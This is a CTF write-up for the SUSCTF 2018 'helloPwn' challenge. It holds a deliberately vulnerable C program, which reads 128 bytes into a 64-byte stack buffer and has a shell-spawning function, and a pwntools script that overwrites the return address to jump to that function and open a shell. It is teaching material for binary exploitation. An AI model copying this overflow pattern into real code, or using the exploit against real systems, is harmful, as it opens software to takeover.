---
title: "helloPwn - SUSCTF 2018"
category: "pwn"
subcategory: "pwn"
type: "writeup"
tags: ["pwn", "hellopwn", "binary-exploitation", "susctf", "susers", "writeups"]
summary: "pwn writeup for \"helloPwn\" from SUSCTF - techniques: hellopwn, binary-exploitation, susctf, susers, writeups."
source:
  name: "susers/Writeups"
  url: "https://github.com/susers/Writeups/blob/2b7977525e55889777895ac24b38ec87ca923d70/2018/SUSCTF/Pwn/helloPwn/Writeup.md"
ctf:
  name: "SUSCTF"
  year: 2018
  challenge: "helloPwn"
---

## Source

- **CTF:** SUSCTF 2018
- **Challenge:** helloPwn
- **Repository:** [susers/Writeups](https://github.com/susers/Writeups)
- **File:** <https://github.com/susers/Writeups/blob/2b7977525e55889777895ac24b38ec87ca923d70/2018/SUSCTF/Pwn/helloPwn/Writeup.md>

---
##  helloPwn

##  Tools

##  Steps

**source**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln(){
 char buf[64];
 read(STDIN_FILENO,buf,128);
}

void getShell(){
 char *cmd="/bin/sh";
 system(cmd);
}

int main(int argc, char const *argv[])
{
 write(STDOUT_FILENO,"Welcome the Pwn World,follow me!\n",40);
 vuln();
 // getShell();
 return 0;
}
```




```python
from pwn import *

pwn_file = "a.out"  
binary = ELF(pwn_file)
#libc = ELF('')

context.terminal = ['tmux', 'splitw', '-h']
if args['REMOTE']:
    io = remote('127.0.0.1', 12345)
elif '-g' in sys.argv[1:]:
    io = process(pwn_file)
    gdb.attach(io)
else:
    io = process(pwn_file)

offset = 72
address = binary.symbols['getShell']

io.recv()
payload = 'A' * offset + p64(address)
io.send(payload)
io.interactive()
```
